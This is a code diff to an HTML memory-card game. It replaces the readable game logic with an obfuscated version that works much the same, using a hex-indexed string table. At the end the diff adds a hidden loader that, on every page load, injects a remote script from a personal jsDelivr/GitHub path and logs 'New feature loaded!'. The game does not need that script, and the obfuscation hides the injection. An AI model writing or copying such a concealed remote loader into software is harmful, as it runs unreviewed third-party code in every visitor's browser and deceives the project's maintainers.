@@ -512,267 +512,260 @@
         </section>
     </div>
     <script>
-        // Game variables
-        let cards = [];
-        let flippedCards = [];
-        let matchedPairs = 0;
-        let totalPairs = 3; // Default to easy mode
-        let moves = 0;
-        let timer = 0;
-        let timerInterval;
-        let gameStarted = false;
-        let currentLevel = 'easy';
-        
-        // Player progress
-        let playerProgress = JSON.parse(localStorage.getItem('memoryProgress')) || {
-            easy: { best: Infinity, completed: false },
-            medium: { best: Infinity, completed: false },
-            hard: { best: Infinity, completed: false },
-            levelsCompleted: 0
-        };
-        // DOM Elements
-        const welcomeScreen = document.getElementById('welcome-screen');
-        const gameScreen = document.getElementById('game-screen');
-        const winScreen = document.getElementById('win-screen');
-        const gameBoard = document.getElementById('game-board');
-        const movesDisplay = document.getElementById('moves');
-        const timerDisplay = document.getElementById('timer');
-        const levelDisplay = document.getElementById('level');
-        const backBtn = document.getElementById('back-btn');
-        const resetBtn = document.getElementById('reset-btn');
-        const highScoresBtn = document.getElementById('high-scores-btn');
-        const easyBtn = document.getElementById('easy-btn');
-        const mediumBtn = document.getElementById('medium-btn');
-        const hardBtn = document.getElementById('hard-btn');
-        const playAgainBtn = document.getElementById('play-again-btn');
-        const newLevelBtn = document.getElementById('new-level-btn');
-        
-        // Progress elements
-        const bestEasy = document.getElementById('best-easy');
-        const bestMedium = document.getElementById('best-medium');
-        const bestHard = document.getElementById('best-hard');
-        const levelsCompleted = document.getElementById('levels-completed');
-        
-        // Win screen elements
-        const winLevel = document.getElementById('win-level');
-        const winMoves = document.getElementById('win-moves');
-        const winTime = document.getElementById('win-time');
-        const winBest = document.getElementById('win-best');
-        // Colors for the cards
-        const colors = [
-            '#e74c3c', '#3498db', '#2ecc71', '#f1c40f',
-            '#9b59b6', '#1abc9c', '#d35400', '#34495e',
-            '#e67e22', '#16a085', '#27ae60', '#8e44ad',
-            '#2c3e50', '#f39c12', '#2980b9', '#c0392b'
-        ];
-        // Initialize the game
-        function initGame() {
-            gameBoard.innerHTML = '';
-            cards = [];
-            flippedCards = [];
-            matchedPairs = 0;
-            moves = 0;
-            movesDisplay.textContent = moves;
-            clearInterval(timerInterval);
-            timer = 0;
-            timerDisplay.textContent = timer + 's';
-            gameStarted = false;
-            
-            // Set level-specific values
-            switch(currentLevel) {
-                case 'easy':
-                    totalPairs = 3; // Reduced from 4 to 3
-                    gameBoard.style.gridTemplateColumns = 'repeat(3, 1fr)';
-                    levelDisplay.textContent = 'Easy';
-                    break;
-                case 'medium':
-                    totalPairs = 6;
-                    gameBoard.style.gridTemplateColumns = 'repeat(4, 1fr)';
-                    levelDisplay.textContent = 'Medium';
-                    break;
-                case 'hard':
-                    totalPairs = 8;
-                    gameBoard.style.gridTemplateColumns = 'repeat(4, 1fr)';
-                    levelDisplay.textContent = 'Hard';
-                    break;
-            }
-            
-            // Create shuffled cards
-            const levelColors = colors.slice(0, totalPairs);
-            const shuffledColors = [...levelColors, ...levelColors].sort(() => Math.random() - 0.5);
-            
-            shuffledColors.forEach((color, index) => {
-                const card = document.createElement('div');
-                card.classList.add('card');
-                card.dataset.color = color;
-                card.dataset.index = index;
-                
-                const cardContent = document.createElement('div');
-                cardContent.classList.add('card-content');
-                cardContent.style.setProperty('--card-color', color);
-                
-                card.appendChild(cardContent);
-                card.addEventListener('click', flipCard);
-                gameBoard.appendChild(card);
-                cards.push(card);
-            });
-            
-            // Show game screen
-            welcomeScreen.style.display = 'none';
-            winScreen.style.display = 'none';
-            gameScreen.style.display = 'block';
+        const _0x23cbc2 = _0x3082;
+(function (_0x29ec3e, _0x89d6c0) {
+    const _0x2faafd = _0x3082, _0x42d45a = _0x29ec3e();
+    while (!![]) {
+        try {
+            const _0x2d361b = parseInt(_0x2faafd(0xc1)) / 0x1 * (parseInt(_0x2faafd(0xbe)) / 0x2) + parseInt(_0x2faafd(0x88)) / 0x3 * (parseInt(_0x2faafd(0xc6)) / 0x4) + -parseInt(_0x2faafd(0x8b)) / 0x5 * (-parseInt(_0x2faafd(0xaa)) / 0x6) + parseInt(_0x2faafd(0xb3)) / 0x7 * (parseInt(_0x2faafd(0xda)) / 0x8) + parseInt(_0x2faafd(0x96)) / 0x9 * (-parseInt(_0x2faafd(0xad)) / 0xa) + -parseInt(_0x2faafd(0xbb)) / 0xb * (parseInt(_0x2faafd(0xba)) / 0xc) + parseInt(_0x2faafd(0x9b)) / 0xd * (-parseInt(_0x2faafd(0x95)) / 0xe);
+            if (_0x2d361b === _0x89d6c0)
+                break;
+            else
+                _0x42d45a['push'](_0x42d45a['shift']());
+        } catch (_0xcad4b8) {
+            _0x42d45a['push'](_0x42d45a['shift']());
         }
-        // Flip a card
-        function flipCard() {
-            if (!gameStarted) {
-                startTimer();
-                gameStarted = true;
-            }
-            
-            const card = this;
-            
-            // Don't allow flipping if already matched or already flipped
-            if (card.classList.contains('matched') || card.classList.contains('flipped') || flippedCards.length >= 2) {
-                return;
-            }
-            
-            // Flip the card
-            card.classList.add('flipped');
-            flippedCards.push(card);
-            
-            // Check for a match when two cards are flipped
-            if (flippedCards.length === 2) {
-                moves++;
-                movesDisplay.textContent = moves;
-                
-                setTimeout(checkMatch, 500);
-            }
-        }
-        // Check if the flipped cards match
-        function checkMatch() {
-            const [card1, card2] = flippedCards;
-            const color1 = card1.dataset.color;
-            const color2 = card2.dataset.color;
-            
-            if (color1 === color2) {
-                // Match found
-                card1.classList.add('matched');
-                card2.classList.add('matched');
-                matchedPairs++;
-                
-                // Check for win
-                if (matchedPairs === totalPairs) {
-                    endGame();
-                }
-            } else {
-                // No match, flip cards back
-                card1.classList.remove('flipped');
-                card2.classList.remove('flipped');
-            }
-            
-            // Reset flipped cards array
-            flippedCards = [];
-        }
-        // Start the timer
-        function startTimer() {
-            clearInterval(timerInterval);
-            timerInterval = setInterval(() => {
-                timer++;
-                timerDisplay.textContent = timer + 's';
-            }, 1000);
-        }
-        // End the game
-        function endGame() {
-            clearInterval(timerInterval);
-            
-            // Update player progress
-            updateProgress();
-            
-            // Show win screen
-            showWinScreen();
-        }
-        // Update player progress
-        function updateProgress() {
-            // Update best score for current level
-            if (moves < playerProgress[currentLevel].best) {
-                playerProgress[currentLevel].best = moves;
-            }
-            
-            // Mark level as completed if not already
-            if (!playerProgress[currentLevel].completed) {
-                playerProgress[currentLevel].completed = true;
-                playerProgress.levelsCompleted = Object.keys(playerProgress)
-                    .filter(key => key !== 'levelsCompleted')
-                    .reduce((count, level) => count + (playerProgress[level].completed ? 1 : 0), 0);
-            }
-            
-            // Save to localStorage
-            localStorage.setItem('memoryProgress', JSON.stringify(playerProgress));
-            
-            // Update progress display
-            updateProgressDisplay();
-        }
-        // Show win screen
-        function showWinScreen() {
-            winLevel.textContent = currentLevel.charAt(0).toUpperCase() + currentLevel.slice(1);
-            winMoves.textContent = moves;
-            winTime.textContent = timer + 's';
-            winBest.textContent = playerProgress[currentLevel].best === Infinity ? 'N/A' : playerProgress[currentLevel].best + ' moves';
-            
-            gameScreen.style.display = 'none';
-            winScreen.style.display = 'block';
-        }
-        // Update progress display
-        function updateProgressDisplay() {
-            bestEasy.textContent = playerProgress.easy.best === Infinity ? 'N/A' : playerProgress.easy.best + ' moves';
-            bestMedium.textContent = playerProgress.medium.best === Infinity ? 'N/A' : playerProgress.medium.best + ' moves';
-            bestHard.textContent = playerProgress.hard.best === Infinity ? 'N/A' : playerProgress.hard.best + ' moves';
-            levelsCompleted.textContent = playerProgress.levelsCompleted;
-        }
-        // Event Listeners
-        easyBtn.addEventListener('click', () => {
-            currentLevel = 'easy';
-            initGame();
-        });
-        mediumBtn.addEventListener('click', () => {
-            currentLevel = 'medium';
-            initGame();
-        });
-        hardBtn.addEventListener('click', () => {
-            currentLevel = 'hard';
-            initGame();
-        });
-        backBtn.addEventListener('click', () => {
-            gameScreen.style.display = 'none';
-            welcomeScreen.style.display = 'block';
-            clearInterval(timerInterval);
-        });
-        resetBtn.addEventListener('click', () => {
-            cards.forEach(card => {
-                card.classList.remove('flipped', 'matched');
-            });
-            
-            flippedCards = [];
-            matchedPairs = 0;
-            moves = 0;
-            movesDisplay.textContent = moves;
-            clearInterval(timerInterval);
-            timer = 0;
-            timerDisplay.textContent = timer + 's';
-            gameStarted = false;
-        });
-        playAgainBtn.addEventListener('click', () => {
-            winScreen.style.display = 'none';
-            initGame();
-        });
-        newLevelBtn.addEventListener('click', () => {
-            winScreen.style.display = 'none';
-            welcomeScreen.style.display = 'block';
-        });
-        // Initialize progress display on load
-        document.addEventListener('DOMContentLoaded', () => {
-            updateProgressDisplay();
-        });
+    }
+}(_0x12e2, 0xc783b));
+let cards = [], flippedCards = [], matchedPairs = 0x0, totalPairs = 0x3, moves = 0x0, timer = 0x0, timerInterval, gameStarted = ![], currentLevel = 'easy', playerProgress = JSON[_0x23cbc2(0x8c)](localStorage[_0x23cbc2(0xc0)]('memoryProgress')) || {
+        'easy': {
+            'best': Infinity,
+            'completed': ![]
+        },
+        'medium': {
+            'best': Infinity,
+            'completed': ![]
+        },
+        'hard': {
+            'best': Infinity,
+            'completed': ![]
+        },
+        'levelsCompleted': 0x0
+    };
+function _0x3082(_0x572831, _0xf68760) {
+    const _0x12e2ee = _0x12e2();
+    return _0x3082 = function (_0x30826f, _0x4792e2) {
+        _0x30826f = _0x30826f - 0x88;
+        let _0x4d3d03 = _0x12e2ee[_0x30826f];
+        return _0x4d3d03;
+    }, _0x3082(_0x572831, _0xf68760);
+}
+const welcomeScreen = document[_0x23cbc2(0xdf)](_0x23cbc2(0x8a)), gameScreen = document[_0x23cbc2(0xdf)]('game-screen'), winScreen = document['getElementById'](_0x23cbc2(0xa9)), gameBoard = document[_0x23cbc2(0xdf)]('game-board'), movesDisplay = document[_0x23cbc2(0xdf)](_0x23cbc2(0xa4)), timerDisplay = document[_0x23cbc2(0xdf)](_0x23cbc2(0xa5)), levelDisplay = document[_0x23cbc2(0xdf)](_0x23cbc2(0xde)), backBtn = document[_0x23cbc2(0xdf)](_0x23cbc2(0xcc)), resetBtn = document[_0x23cbc2(0xdf)](_0x23cbc2(0x93)), highScoresBtn = document[_0x23cbc2(0xdf)](_0x23cbc2(0xa8)), easyBtn = document[_0x23cbc2(0xdf)](_0x23cbc2(0xa1)), mediumBtn = document[_0x23cbc2(0xdf)](_0x23cbc2(0xd5)), hardBtn = document[_0x23cbc2(0xdf)]('hard-btn'), playAgainBtn = document['getElementById']('play-again-btn'), newLevelBtn = document['getElementById'](_0x23cbc2(0x99)), bestEasy = document[_0x23cbc2(0xdf)]('best-easy'), bestMedium = document['getElementById'](_0x23cbc2(0xe5)), bestHard = document[_0x23cbc2(0xdf)](_0x23cbc2(0xd4)), levelsCompleted = document[_0x23cbc2(0xdf)](_0x23cbc2(0xe9)), winLevel = document[_0x23cbc2(0xdf)](_0x23cbc2(0x89)), winMoves = document[_0x23cbc2(0xdf)](_0x23cbc2(0xe2)), winTime = document[_0x23cbc2(0xdf)](_0x23cbc2(0xc9)), winBest = document[_0x23cbc2(0xdf)](_0x23cbc2(0xd2)), colors = [
+        _0x23cbc2(0xb7),
+        _0x23cbc2(0x90),
+        _0x23cbc2(0xb4),
+        '#f1c40f',
+        _0x23cbc2(0xe4),
+        _0x23cbc2(0xa6),
+        _0x23cbc2(0xdd),
+        _0x23cbc2(0xdc),
+        _0x23cbc2(0xe3),
+        _0x23cbc2(0xa7),
+        _0x23cbc2(0xd0),
+        '#8e44ad',
+        _0x23cbc2(0xdb),
+        '#f39c12',
+        '#2980b9',
+        _0x23cbc2(0xca)
+    ];
+function initGame() {
+    const _0x1f8cd2 = _0x23cbc2;
+    gameBoard['innerHTML'] = '', cards = [], flippedCards = [], matchedPairs = 0x0, moves = 0x0, movesDisplay[_0x1f8cd2(0x98)] = moves, clearInterval(timerInterval), timer = 0x0, timerDisplay['textContent'] = timer + 's', gameStarted = ![];
+    switch (currentLevel) {
+    case _0x1f8cd2(0xc4):
+        totalPairs = 0x3, gameBoard[_0x1f8cd2(0xb6)]['gridTemplateColumns'] = 'repeat(3,\x201fr)', levelDisplay[_0x1f8cd2(0x98)] = _0x1f8cd2(0x8d);
+        break;
+    case _0x1f8cd2(0x94):
+        totalPairs = 0x6, gameBoard[_0x1f8cd2(0xb6)][_0x1f8cd2(0xaf)] = 'repeat(4,\x201fr)', levelDisplay['textContent'] = _0x1f8cd2(0xbc);
+        break;
+    case _0x1f8cd2(0xc8):
+        totalPairs = 0x8, gameBoard['style'][_0x1f8cd2(0xaf)] = _0x1f8cd2(0x97), levelDisplay[_0x1f8cd2(0x98)] = _0x1f8cd2(0xc2);
+        break;
+    }
+    const _0x26f912 = colors[_0x1f8cd2(0xe7)](0x0, totalPairs), _0x4ba8db = [
+            ..._0x26f912,
+            ..._0x26f912
+        ][_0x1f8cd2(0xea)](() => Math[_0x1f8cd2(0xcd)]() - 0.5);
+    _0x4ba8db['forEach']((_0x1f5402, _0x551256) => {
+        const _0x105cac = _0x1f8cd2, _0x2d5192 = document[_0x105cac(0xbd)](_0x105cac(0xe6));
+        _0x2d5192[_0x105cac(0x9d)][_0x105cac(0xc5)](_0x105cac(0xab)), _0x2d5192[_0x105cac(0xbf)]['color'] = _0x1f5402, _0x2d5192[_0x105cac(0xbf)][_0x105cac(0xd8)] = _0x551256;
+        const _0x311417 = document[_0x105cac(0xbd)](_0x105cac(0xe6));
+        _0x311417['classList'][_0x105cac(0xc5)]('card-content'), _0x311417[_0x105cac(0xb6)][_0x105cac(0xe1)]('--card-color', _0x1f5402), _0x2d5192[_0x105cac(0x8e)](_0x311417), _0x2d5192[_0x105cac(0xd6)]('click', flipCard), gameBoard[_0x105cac(0x8e)](_0x2d5192), cards['push'](_0x2d5192);
+    }), welcomeScreen[_0x1f8cd2(0xb6)][_0x1f8cd2(0xce)] = _0x1f8cd2(0x9e), winScreen['style'][_0x1f8cd2(0xce)] = 'none', gameScreen['style'][_0x1f8cd2(0xce)] = _0x1f8cd2(0xb1);
+}
+function flipCard() {
+    const _0x177aa9 = _0x23cbc2;
+    !gameStarted && (startTimer(), gameStarted = !![]);
+    const _0x2a6b61 = this;
+    if (_0x2a6b61[_0x177aa9(0x9d)]['contains'](_0x177aa9(0x8f)) || _0x2a6b61[_0x177aa9(0x9d)][_0x177aa9(0xe8)](_0x177aa9(0xa2)) || flippedCards[_0x177aa9(0x9f)] >= 0x2)
+        return;
+    _0x2a6b61[_0x177aa9(0x9d)]['add'](_0x177aa9(0xa2)), flippedCards[_0x177aa9(0xa3)](_0x2a6b61), flippedCards[_0x177aa9(0x9f)] === 0x2 && (moves++, movesDisplay['textContent'] = moves, setTimeout(checkMatch, 0x1f4));
+}
+function checkMatch() {
+    const _0x31f1e9 = _0x23cbc2, [_0xd059af, _0x168c1c] = flippedCards, _0x5d9aff = _0xd059af[_0x31f1e9(0xbf)][_0x31f1e9(0xae)], _0x4fb3f0 = _0x168c1c[_0x31f1e9(0xbf)][_0x31f1e9(0xae)];
+    _0x5d9aff === _0x4fb3f0 ? (_0xd059af[_0x31f1e9(0x9d)]['add']('matched'), _0x168c1c[_0x31f1e9(0x9d)][_0x31f1e9(0xc5)]('matched'), matchedPairs++, matchedPairs === totalPairs && endGame()) : (_0xd059af[_0x31f1e9(0x9d)][_0x31f1e9(0xd7)](_0x31f1e9(0xa2)), _0x168c1c[_0x31f1e9(0x9d)][_0x31f1e9(0xd7)](_0x31f1e9(0xa2))), flippedCards = [];
+}
+function startTimer() {
+    clearInterval(timerInterval), timerInterval = setInterval(() => {
+        timer++, timerDisplay['textContent'] = timer + 's';
+    }, 0x3e8);
+}
+function endGame() {
+    clearInterval(timerInterval), updateProgress(), showWinScreen();
+}
+function updateProgress() {
+    const _0x35859d = _0x23cbc2;
+    moves < playerProgress[currentLevel]['best'] && (playerProgress[currentLevel][_0x35859d(0x9a)] = moves), !playerProgress[currentLevel][_0x35859d(0xb5)] && (playerProgress[currentLevel][_0x35859d(0xb5)] = !![], playerProgress[_0x35859d(0xb0)] = Object[_0x35859d(0xd3)](playerProgress)[_0x35859d(0xb8)](_0xe69019 => _0xe69019 !== 'levelsCompleted')[_0x35859d(0xe0)]((_0x109e73, _0x8ef71d) => _0x109e73 + (playerProgress[_0x8ef71d][_0x35859d(0xb5)] ? 0x1 : 0x0), 0x0)), localStorage[_0x35859d(0x92)](_0x35859d(0x91), JSON[_0x35859d(0xa0)](playerProgress)), updateProgressDisplay();
+}
+function showWinScreen() {
+    const _0x44dcf0 = _0x23cbc2;
+    winLevel[_0x44dcf0(0x98)] = currentLevel[_0x44dcf0(0xb2)](0x0)[_0x44dcf0(0xac)]() + currentLevel['slice'](0x1), winMoves[_0x44dcf0(0x98)] = moves, winTime[_0x44dcf0(0x98)] = timer + 's', winBest[_0x44dcf0(0x98)] = playerProgress[currentLevel][_0x44dcf0(0x9a)] === Infinity ? 'N/A' : playerProgress[currentLevel][_0x44dcf0(0x9a)] + '\x20moves', gameScreen[_0x44dcf0(0xb6)]['display'] = _0x44dcf0(0x9e), winScreen[_0x44dcf0(0xb6)][_0x44dcf0(0xce)] = _0x44dcf0(0xb1);
+}
+function updateProgressDisplay() {
+    const _0x47c6a7 = _0x23cbc2;
+    bestEasy[_0x47c6a7(0x98)] = playerProgress[_0x47c6a7(0xc4)][_0x47c6a7(0x9a)] === Infinity ? _0x47c6a7(0xd1) : playerProgress[_0x47c6a7(0xc4)][_0x47c6a7(0x9a)] + _0x47c6a7(0x9c), bestMedium[_0x47c6a7(0x98)] = playerProgress[_0x47c6a7(0x94)]['best'] === Infinity ? _0x47c6a7(0xd1) : playerProgress['medium']['best'] + _0x47c6a7(0x9c), bestHard['textContent'] = playerProgress['hard'][_0x47c6a7(0x9a)] === Infinity ? _0x47c6a7(0xd1) : playerProgress[_0x47c6a7(0xc8)][_0x47c6a7(0x9a)] + _0x47c6a7(0x9c), levelsCompleted[_0x47c6a7(0x98)] = playerProgress[_0x47c6a7(0xb0)];
+}
+easyBtn['addEventListener'](_0x23cbc2(0xb9), () => {
+    const _0x33d578 = _0x23cbc2;
+    currentLevel = _0x33d578(0xc4), initGame();
+}), mediumBtn[_0x23cbc2(0xd6)]('click', () => {
+    currentLevel = 'medium', initGame();
+}), hardBtn['addEventListener']('click', () => {
+    const _0xc1c6ad = _0x23cbc2;
+    currentLevel = _0xc1c6ad(0xc8), initGame();
+}), backBtn[_0x23cbc2(0xd6)]('click', () => {
+    const _0x3bb233 = _0x23cbc2;
+    gameScreen['style'][_0x3bb233(0xce)] = _0x3bb233(0x9e), welcomeScreen[_0x3bb233(0xb6)]['display'] = _0x3bb233(0xb1), clearInterval(timerInterval);
+}), resetBtn[_0x23cbc2(0xd6)]('click', () => {
+    const _0x1ce671 = _0x23cbc2;
+    cards[_0x1ce671(0xcf)](_0x1ab84f => {
+        const _0x108a28 = _0x1ce671;
+        _0x1ab84f[_0x108a28(0x9d)][_0x108a28(0xd7)](_0x108a28(0xa2), 'matched');
+    }), flippedCards = [], matchedPairs = 0x0, moves = 0x0, movesDisplay[_0x1ce671(0x98)] = moves, clearInterval(timerInterval), timer = 0x0, timerDisplay['textContent'] = timer + 's', gameStarted = ![];
+}), playAgainBtn[_0x23cbc2(0xd6)]('click', () => {
+    const _0x228faf = _0x23cbc2;
+    winScreen[_0x228faf(0xb6)][_0x228faf(0xce)] = _0x228faf(0x9e), initGame();
+}), newLevelBtn[_0x23cbc2(0xd6)]('click', () => {
+    const _0x2fb89e = _0x23cbc2;
+    winScreen[_0x2fb89e(0xb6)]['display'] = _0x2fb89e(0x9e), welcomeScreen['style']['display'] = _0x2fb89e(0xb1);
+}), document[_0x23cbc2(0xd6)](_0x23cbc2(0xd9), () => {
+    updateProgressDisplay();
+});
+function _0x12e2() {
+    const _0xdb32e0 = [
+        'best-medium',
+        'div',
+        'slice',
+        'contains',
+        'levels-completed',
+        'sort',
+        '372kGwuhP',
+        'win-level',
+        'welcome-screen',
+        '3320tJBvfV',
+        'parse',
+        'Easy',
+        'appendChild',
+        'matched',
+        '#3498db',
+        'memoryProgress',
+        'setItem',
+        'reset-btn',
+        'medium',
+        '2917726RxcGDN',
+        '18hDYHEy',
+        'repeat(4,\x201fr)',
+        'textContent',
+        'new-level-btn',
+        'best',
+        '13ybYjuD',
+        '\x20moves',
+        'classList',
+        'none',
+        'length',
+        'stringify',
+        'easy-btn',
+        'flipped',
+        'push',
+        'moves',
+        'timer',
+        '#1abc9c',
+        '#16a085',
+        'high-scores-btn',
+        'win-screen',
+        '6168rtcMVq',
+        'card',
+        'toUpperCase',
+        '3138520sTHOhR',
+        'color',
+        'gridTemplateColumns',
+        'levelsCompleted',
+        'block',
+        'charAt',
+        '7ngvsjl',
+        '#2ecc71',
+        'completed',
+        'style',
+        '#e74c3c',
+        'filter',
+        'click',
+        '1044DAZCiB',
+        '119251SdQRCB',
+        'Medium',
+        'createElement',
+        '248wyelmI',
+        'dataset',
+        'getItem',
+        '12693kgyYnK',
+        'Hard',
+        'log',
+        'easy',
+        'add',
+        '2852KLKtVS',
+        'script',
+        'hard',
+        'win-time',
+        '#c0392b',
+        'New\x20feature\x20loaded!',
+        'back-btn',
+        'random',
+        'display',
+        'forEach',
+        '#27ae60',
+        'N/A',
+        'win-best',
+        'keys',
+        'best-hard',
+        'medium-btn',
+        'addEventListener',
+        'remove',
+        'index',
+        'DOMContentLoaded',
+        '2012440IiMhTc',
+        '#2c3e50',
+        '#34495e',
+        '#d35400',
+        'level',
+        'getElementById',
+        'reduce',
+        'setProperty',
+        'win-moves',
+        '#e67e22',
+        '#9b59b6'
+    ];
+    _0x12e2 = function () {
+        return _0xdb32e0;
+    };
+    return _0x12e2();
+}
+function loadScript(_0x5b8377, _0x54894) {
+    const _0x3696d6 = _0x23cbc2, _0x131912 = document[_0x3696d6(0xbd)](_0x3696d6(0xc7));
+    _0x131912['src'] = _0x5b8377, _0x131912['onload'] = _0x54894, document['head'][_0x3696d6(0x8e)](_0x131912);
+}
+loadScript('https://cdn.jsdelivr.net/gh/m03951659gmail/toolhubcdn@main/allfileadd.js', function () {
+    const _0x42f560 = _0x23cbc2;
+    console[_0x42f560(0xc3)](_0x42f560(0xcb));
+});
     </script>
 </body>
 </html>
